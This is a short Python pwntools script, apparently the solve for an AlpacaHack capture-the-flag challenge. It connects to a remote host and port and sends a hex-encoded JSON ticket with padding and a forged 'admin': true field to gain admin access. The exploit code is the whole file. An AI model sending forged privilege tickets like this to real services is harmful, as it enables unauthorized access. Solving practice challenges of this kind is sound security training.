# https://github.com/baumroll0928-spec/myRepository/tree/main/Daily_AlpacaHack/m202607/d17_biribiri

import pwn
import json

HOST, PORT = "34.170.146.252", 40338
p = pwn.remote(HOST, PORT)

ticket = json.dumps(
    {"user": "guest", "memo": "A" * 64, "admin": True}, separators=(",", ":")
).encode()
payload = ticket.hex().encode()
p.sendlineafter(b"ticket hex > ", payload)

print(p.recvall().decode())
